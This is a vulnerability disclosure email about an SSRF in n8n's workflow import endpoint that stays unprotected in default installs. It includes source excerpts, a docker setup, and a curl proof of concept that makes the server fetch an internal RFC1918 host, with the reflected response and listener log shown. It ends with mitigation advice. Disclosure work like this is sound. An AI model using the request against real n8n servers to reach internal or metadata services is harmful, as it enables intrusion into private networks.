Subject: n8n: SSRF in /rest/workflows/from-url remains exploitable in default configuration (incomplete fix, no CVE)

Hello,

This reports a server-side request forgery (SSRF) in n8n's workflow import
endpoint. SSRF protection for this path was added in n8n 2.20.0, but only behind
an opt-in flag. On a default install the endpoint remains exploitable, including
in the current stable release 2.27.4; the current pre-release 2.28.2 is likewise
exploitable. n8n shipped the change as an ordinary bugfix; no CVE or security
advisory was assigned, so operators are not told this is a security-relevant
setting they need to act on.

Product:  n8n (https://github.com/n8n-io/n8n)
Affected: <= 2.19.x unconditionally; 2.20.0+ when
          N8N_SSRF_PROTECTION_ENABLED is not set to true (default false)
          verified on 2.27.4 (stable) by source review and 2.28.2 (pre-release)
          by live test
Type:     SSRF (CWE-918)
CVE:      none assigned

== Summary ==

GET /rest/workflows/from-url takes a user-controlled "url" query parameter and
makes a server-side HTTP request to it. Any authenticated user with
project-scoped workflow:create permission can use it to make the n8n server
fetch arbitrary URLs, including loopback (127.0.0.1), the link-local range
(169.254.0.0/16, used by some cloud metadata services where reachable), and
RFC1918 internal addresses. When the fetched target returns JSON shaped like an
n8n workflow ({"nodes":..., "connections":...}), the response body is reflected
back to the caller.

== The fix, and why it is incomplete ==

In packages/cli/src/workflows/workflows.controller.ts the handler now routes the
URL through n8n's SsrfProtectionService:

    private async fetchWorkflowFromUrl(url: string) {
      const client = this.outboundHttp.requests({
        ssrf: this.ssrfConfig.enabled ? this.ssrfProtectionService : 'disabled',
      });
      ...
    }

Protection is conditional on this.ssrfConfig.enabled. That flag defaults to off.
From packages/@n8n/config/src/configs/ssrf-protection.config.ts (verified on tag
n8n@2.28.2):

    @Env('N8N_SSRF_PROTECTION_ENABLED')
    enabled: boolean = false;

So on a default install fetchWorkflowFromUrl passes ssrf: 'disabled' and performs
an unvalidated outbound request. The SSRF is unmitigated out of the box on every
release from 2.20.0 onward, including current stable 2.27.4. When the flag IS set
to true the request is routed
through SsrfProtectionService, which validates the resolved IP at pre-flight, at
socket connect time via a custom DNS lookup (so a rebinding TOCTOU is rechecked),
and on each HTTP redirect hop, against a blocklist covering loopback, link-local
and RFC1918 ranges.

           N8N_SSRF_PROTECTION_ENABLED=true   default (flag unset)
  <=2.19.x  vulnerable                          vulnerable
  2.20.0+   protected                           VULNERABLE

== Proof of concept (executed against n8nio/n8n:2.28.2 on 2026-06-26 local time; listener timestamps below are UTC) ==

Default install, no flags:

    docker run -d -p 5678:5678 -e N8N_SECURE_COOKIE=false n8nio/n8n:2.28.2
    # create owner, obtain auth cookie and a personal projectId, then point the
    # import at an internal RFC1918 host running a logging listener:

    curl -s -G -b cookies.txt 'http://localhost:5678/rest/workflows/from-url' \
      --data-urlencode "projectId=$PROJECT_ID" \
      --data-urlencode 'url=http://172.17.0.1:8888/'

Result (protection OFF / default) -- the fetch fires and the body is reflected:

    {"data":{"nodes":[],"connections":{},"secret":"SSRF_CONFIRMED_2282"}}
    --> HTTP 200

Listener access log on the internal host (server-side proof, request originates
from the n8n container 172.17.0.2, User-Agent "n8n"):

    2026-06-27T04:20:15Z VICTIM-HIT path=/ UA=n8n from=172.17.0.2

A loopback target (http://127.0.0.1:5678/rest/settings) likewise fires the
server-side request, returning HTTP 400 only because the body is not
workflow-shaped -- the request has already been made.

Contrast -- identical request with N8N_SSRF_PROTECTION_ENABLED=true:

    {"code":0,"message":"The request was blocked because it resolves to a restricted IP address"}
    --> HTTP 400

With the flag on, no request reaches the listener (no new log entry). This
confirms the protection exists and works; the shipped controller disables the
SSRF bridge when the flag is unset, leaving this request path unprotected by
default.

== Vendor handling ==

The fix (PR #29178, https://github.com/n8n-io/n8n/pull/29178, merged 2026-04-29,
released in 2.20.0 on 2026-05-05) was independent internal n8n work tracked under
their ticket CAT-2890; it was opened on 2026-04-27, before my own report of the
same issue on 2026-04-29. I do not claim credit for the fix.
n8n's security team reviewed my report and on 2026-05-20 determined it did not
qualify. No CVE or advisory was issued for the change.

I am posting because, regardless of that history, the current released behavior
is a real and verifiable SSRF that is unmitigated in the default configuration.

== Mitigation for operators ==

Set N8N_SSRF_PROTECTION_ENABLED=true. This routes the import endpoint (and the
HTTP Request node path) through the IP blocklist. Verify with the PoC above
(it should then be rejected). Consider also restricting egress at the network
layer.

A CVE for the default-configuration exposure would help operators track this; I
have not obtained one. Suggestions on assignment welcome.

Regards,
Akshat Sinha
Public write-up: https://github.com/akshatgit/public-disclosure/blob/main/advisories/2026-06-26-n8n-ssrf-workflows-from-url.md
